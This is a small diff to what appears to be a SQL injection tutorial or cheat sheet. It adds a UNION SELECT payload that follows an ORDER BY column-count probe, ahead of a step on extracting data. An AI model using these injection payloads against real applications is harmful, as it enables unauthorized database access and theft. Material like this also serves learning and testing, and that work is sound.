@@ -206,6 +206,8 @@
 
 ```sql
 ' ORDER BY 1--
+#then check where each column falls
+' UNION select 1,2,3-- -
 ```
 
 4. Extract data:
